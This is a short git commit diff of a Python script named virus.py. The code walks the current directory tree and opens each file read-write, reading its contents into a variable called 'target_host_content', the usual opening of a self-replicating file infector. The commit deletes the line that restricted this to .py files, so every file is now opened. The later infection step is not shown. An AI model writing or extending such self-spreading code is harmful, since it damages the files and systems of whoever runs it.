8e9be2b3985f19d42e64ed43ec18a43631af6969
John Fisher <29438743+jg-fisher@users.noreply.github.com>
2020-05-31 05:26:11 -0700

    Update virus.py

--- virus.py
+++ virus.py
@@ -2,7 +2,6 @@
 import os
 for root, dirs, files in os.walk(os.getcwd()):
     for f in files:
-        if f.endswith('.py'):
             print('.\\' +f, __file__)
             with open(f, 'r+') as f:
                 target_host_content = f.read()
